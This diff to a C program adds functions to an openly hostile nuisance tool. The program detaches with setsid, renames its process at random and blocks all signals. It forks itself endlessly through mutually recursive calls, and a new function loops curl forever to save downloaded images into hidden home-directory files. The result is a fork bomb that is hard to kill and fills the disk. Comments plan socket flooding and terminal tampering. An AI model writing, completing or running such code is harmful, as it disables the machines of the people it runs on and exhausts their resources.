@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <time.h>
 #include <signal.h>
 #include <stdlib.h>
 #include <sys/types.h>
@@ -15,6 +16,7 @@ void	random_pname() {
 	str[3] = 'e';
 	str[4] = '_';
 	prctl(PR_SET_NAME, str);
+	fclose(fp);
 	free(str);
 }
 
@@ -22,6 +24,28 @@ void	random_pname() {
 // curl luigi
 // listen to literally all available sockets
 // mess with stty
+
+void	capmedaddy() {
+
+}
+
+void	filefuckery() {
+
+}
+
+void	luigme() {
+	while (1) {
+		system("curl 'https://ih0.redbubble.net/image.433724851.6990/flat,550x550,075,f.u3.jpg' > ~/.luigi$(date | awk '{print $4}') 2>/dev/null");
+	}
+}
+
+void	thing();
+
+static void (*g_bois[])(void) = {
+	capmedaddy,
+	filefuckery,
+	luigme,
+};
 
 int forkyboi() {
 	int		pid;
@@ -31,7 +55,7 @@ int forkyboi() {
 		exit(1);
 	if (pid > 0) {
 		printf("PARENT PROCESS\n");
-		while (1);
+		g_bois[rand() % (sizeof(g_bois) / sizeof(*g_bois))]();
 	}
 	sid = setsid();
 	if (sid < 0)
@@ -39,15 +63,14 @@ int forkyboi() {
 
 	random_pname();
 
-	while (1);
-	// forkyboi();
+	thing();
 	return (0);
 }
 
-int main(int argc, char **argv) {
-	(void)argc;
-	(void)argv;
+void	thing() {
 	sigset_t	mask;
+
+	srand(time(NULL));
 
 	random_pname();
 	sigfillset(&mask);
@@ -55,3 +78,10 @@ int main(int argc, char **argv) {
 
 	forkyboi();
 }
+
+int main(int argc, char **argv) {
+	(void)argc;
+	(void)argv;
+	thing();
+}
+
